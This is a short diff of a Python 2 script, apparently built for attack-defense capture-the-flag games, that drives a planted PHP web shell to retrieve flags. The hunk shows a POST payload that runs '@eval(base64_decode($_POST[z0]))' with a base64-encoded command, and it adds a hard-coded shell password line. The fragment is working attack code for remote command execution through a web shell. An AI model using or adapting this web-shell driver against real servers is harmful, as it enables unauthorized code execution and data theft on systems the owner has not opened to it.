@@ -54,6 +54,7 @@ def getflag(url,method,passwd,flag_path):
 			file_write(flag_path,"\n[+] %s Getflag Failed! You can check the shell's passwd!\n\n"%url)
 			print "[+] %s Getflag Failed! You can check the shell's passwd!"%url
 	elif method=='post':
+		data['pass']='Sn3rtf4ck'
 		data[passwd]='@eval(base64_decode($_POST[z0]));'
 		data['z0']=base64.b64encode(getflag_cmd)
 		try:
